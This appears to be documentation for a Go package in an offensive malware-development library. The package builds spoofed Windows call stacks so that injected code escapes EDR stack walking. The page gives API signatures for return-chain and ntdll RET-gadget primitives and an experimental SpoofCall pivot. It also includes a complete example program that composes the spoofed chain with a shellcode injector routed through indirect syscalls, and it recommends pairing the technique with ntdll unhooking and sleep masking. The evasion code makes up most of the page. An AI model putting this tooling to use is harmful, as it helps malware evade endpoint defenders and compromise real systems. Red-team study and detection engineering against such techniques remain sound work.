---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# Call-Stack Spoofing — Metadata Primitives

[<- Back to Evasion](README.md)

**MITRE ATT&CK:** [T1036 — Masquerading](https://attack.mitre.org/techniques/T1036/)
**Package:** `evasion/callstack`
**Platform:** Windows amd64
**Detection:** Medium

---

## Primer

Modern EDR and DFIR tooling routinely walks the stack of a suspicious
thread to see *who called that VirtualAllocEx / CreateRemoteThread /
NtUnmapViewOfSection*. The walker uses `RtlVirtualUnwind` (or its
kernel-mode sibling), which reads the PE `.pdata` table to locate the
`RUNTIME_FUNCTION` for the current `RIP`, then follows the stored
unwind info to climb up one frame at a time.

A **spoofed call stack** replaces the top frames of that walk with
addresses that look like a vanilla thread-init sequence
(`RtlUserThreadStart → BaseThreadInitThunk → ...`) — the walker cannot
distinguish the injected frames from a genuine execution path unless
it cross-validates `RIP` against ETW Threat-Intelligence or performs
its own control-flow reconstruction.

`evasion/callstack` ships the **metadata primitives** required to
build such a chain. The asm pivot that actually executes a call
through a synthesized chain is tracked as **v0.16.1** work — this
release provides the building blocks so higher-level packages
(`inject`, `evasion/unhook`, a future `sleepmask` L4 strategy) can
compose their own pivots without re-solving the `RUNTIME_FUNCTION`
plumbing.

---

## What ships in v0.16.0

```go
// LookupFunctionEntry wraps ntdll!RtlLookupFunctionEntry. Given any
// instruction address inside a loaded PE, returns a Frame populated
// with ReturnAddress + ImageBase + RUNTIME_FUNCTION (copied by value).
func LookupFunctionEntry(addr uintptr) (Frame, error)

// StandardChain returns a cached 2-frame return chain rooted at the
// Windows thread-init sequence:
//   [0] kernel32!BaseThreadInitThunk  (inner — direct caller of target)
//   [1] ntdll!RtlUserThreadStart      (outer — thread entry point)
// Both frames carry full RUNTIME_FUNCTION metadata so a stack walker
// following them finds unwind info at every step.
func StandardChain() ([]Frame, error)

// FindReturnGadget scans ntdll's .text for a lone RET (0xC3 followed by
// int3/nop padding) and returns its absolute address. Callers planting
// a fake return on the stack point there so the target's RET jumps
// into a well-known ntdll address — ntdll .pdata covers every .text
// byte, guaranteeing unwind metadata for the fake frame.
func FindReturnGadget() (uintptr, error)

// Validate checks a chain's structural consistency: non-zero
// ReturnAddress/ImageBase/UnwindInfoAddress, ControlPc bounded by
// RUNTIME_FUNCTION [Begin, End). Catches the most-likely spoof-
// construction mistakes (swapped RVA vs absolute, stale post-reload
// metadata) before they blow up at RtlVirtualUnwind time.
func Validate(chain []Frame) error

// Frame pairs a return address with its RUNTIME_FUNCTION row.
type Frame struct {
    ReturnAddress   uintptr
    ImageBase       uintptr
    RuntimeFunction RuntimeFunction
}

// RuntimeFunction mirrors the Windows amd64 RUNTIME_FUNCTION struct.
type RuntimeFunction struct {
    BeginAddress      uint32
    EndAddress        uint32
    UnwindInfoAddress uint32
}
```

---

## How Spoofing Works

```mermaid
sequenceDiagram
    participant G as Caller (Go)
    participant S as Spoof pivot (future v0.16.1)
    participant T as Target fn
    participant W as RtlVirtualUnwind
    participant N as ntdll!RET gadget

    Note over G: Build chain via StandardChain() + FindReturnGadget()
    G->>S: SpoofCall(target, chain, args)
    S->>S: Plant [fakeRet | realRet] on stack
    S->>T: JMP target (not CALL)
    Note over T: Executes body. RIP inside target.
    W->>T: Snapshot RIP at sampling moment
    W->>T: Lookup RUNTIME_FUNCTION(RIP)
    W-->>W: Unwinds via target's .pdata
    W->>N: Lands on fakeRet → ntdll RET gadget
    W->>N: Lookup RUNTIME_FUNCTION(fakeRet)
    W-->>W: Walks ntdll frame metadata
    W-->>G: Report BaseThreadInitThunk → RtlUserThreadStart (plausible)

    T-->>N: RET pops fakeRet
    N-->>G: RET pops realRet, back to Go
```

The **v0.16.0 building blocks** cover the "lookup" arrows; the pivot
(push + JMP + real-RET recovery) is what `v0.16.1` will add in plan9
asm.

---

## Usage today

Consumers can already build a validated chain and hand it off to a
custom pivot (e.g., one implemented elsewhere in an operator's code
base):

```go
chain, err := callstack.StandardChain()
if err != nil { log.Fatal(err) }

ret, err := callstack.FindReturnGadget()
if err != nil { log.Fatal(err) }

if err := callstack.Validate(chain); err != nil {
    log.Fatalf("chain invalid: %v", err)
}

// Build stack layout: [fakeRet=ret, ...chain metadata for walker...]
// then call target through the operator's own asm pivot.
```

## v0.16.1 — `SpoofCall` scaffold (experimental)

The asm pivot landed as a scaffold post-v0.16.0 but its end-to-end
execution path is fragile in Go's M:N runtime. The Go layer + plan9
asm (`spoof_windows_amd64.s`) ship together so future debug iterations
have a stable starting point; promotion to a tagged release waits on
the `lastcontinuehandler` crash being root-caused.

```go
// v0.16.1 scaffold — gated behind MALDEV_SPOOFCALL_E2E=1, default off
func SpoofCall(target unsafe.Pointer, chain []Frame, args ...uintptr) (uintptr, error)

var (
    ErrEmptyChain  = errors.New("callstack: empty spoof chain")
    ErrTooManyArgs = errors.New("callstack: SpoofCall accepts at most 4 args (Win64 RCX/RDX/R8/R9)")
)
```

Caller-side validation (nil target, empty chain, oversized args,
`Validate(chain)` passthrough) all run before the pivot. Each
`chain[i].ReturnAddress` MUST be a lone-RET gadget address (e.g.
`FindReturnGadget()`'s result), NOT a function entry — when target's
RET pops the chain, the CPU jumps there and immediately RETs to the
next entry.

## Composed — chain + injection landing-site spoof

A typical caller composes the metadata primitives with their own
injection pipeline so the planted memory looks like a normal
thread-init landing site to anyone walking the stack mid-payload:

```go
package main

import (
	"log"
	"unsafe"

	"github.com/oioio-space/maldev/evasion/callstack"
	"github.com/oioio-space/maldev/inject"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

func main() {
	// 1. Build the validated chain — every frame carries RUNTIME_FUNCTION
	//    metadata so a stack walker fed our planted bytes will resolve
	//    BaseThreadInitThunk → RtlUserThreadStart instead of our module.
	stdChain, err := callstack.StandardChain()
	if err != nil { log.Fatal(err) }
	if err := callstack.Validate(stdChain); err != nil { log.Fatal(err) }

	// 2. Locate a lone RET gadget inside ntdll's .text — used as the
	//    fakeRet address that target's RET pops.
	gadget, err := callstack.FindReturnGadget()
	if err != nil { log.Fatal(err) }
	gadgetFrame, err := callstack.LookupFunctionEntry(gadget)
	if err != nil { log.Fatal(err) }

	// 3. Build an injector with a stealth syscall caller — we want every
	//    Nt* call routed via indirect syscall + HashGate in the same
	//    process the spoofed-stack walker would inspect.
	caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHashGate())
	cfg := &inject.WindowsConfig{
		Config:        inject.Config{Method: inject.MethodCreateThread},
		SyscallMethod: wsyscall.MethodIndirect,
	}
	inj, err := inject.NewWindowsInjector(cfg)
	if err != nil { log.Fatal(err) }
	_ = caller

	// 4. (Optional) hand the chain off to your own pivot OR — when v0.16.1
	//    e2e is debugged — to callstack.SpoofCall(target, chain, args...).
	//    Until then, the metadata is consumed by external assembly.
	full := append([]callstack.Frame{gadgetFrame}, stdChain...)
	_ = full
	_ = unsafe.Pointer(nil)
	_ = windows.Handle(0)

	// 5. Run the actual injection.
	shellcode := []byte{0x90, 0x90, 0xC3} // placeholder
	if err := inj.Inject(shellcode); err != nil { log.Fatal(err) }
}
```

The chain is one piece of the deception; pair it with
[ntdll unhooking](ntdll-unhooking.md) and an [indirect-syscall
caller](../../syscalls.md) so a walker that lands on any of our hot
calls sees ntdll-resident addresses with valid `.pdata` metadata.

---

## Limitations

- **x64 only.** x86 uses frame-pointer walking rather than
  `.pdata`-based unwind, which requires a different spoof strategy.
- **Synthetic frames detected by ETW Threat-Intelligence.** Some EDRs
  (especially those consuming the TI provider) cross-check every
  stack frame RIP against the current call graph and can still flag
  a synthesized chain. `evasion/callstack` makes the chain
  *plausible*, not *indistinguishable*.
- **Module relocations.** `StandardChain` caches the frames after
  first call; if the target module unmaps + remaps at a new base
  (unusual but possible under ASLR-stressed environments), the
  cached frames become stale. Clear the cache by spawning a fresh
  process, or build a one-shot chain via `LookupFunctionEntry`.
- **No hardware-breakpoint variant yet.** The `fortra/hw-call-stack`
  technique (HWBP on RET gadget for stronger obfuscation) is
  separate future work, orthogonal to `v0.16.1`'s synthetic-frame
  pivot.

---

## API Reference

See [package doc](https://pkg.go.dev/github.com/oioio-space/maldev/evasion/callstack).

Every export is error-surfacing; `ErrUnsupportedPlatform`,
`ErrFunctionEntryNotFound`, and `ErrGadgetNotFound` exist for
`errors.Is` discrimination.

## See also

- [Evasion area README](README.md)
- [`evasion/sleepmask`](sleep-mask.md) — pair with sleep-mask so spoofed frames are also wiped between callbacks
- [`win/syscall`](../syscalls/direct-indirect.md) — `MethodIndirect` returns into ntdll, complementary stack-stealth path
- [`recon/hwbp`](../recon/hw-breakpoints.md) — companion HW-BP variant tracked under backlog P2.6
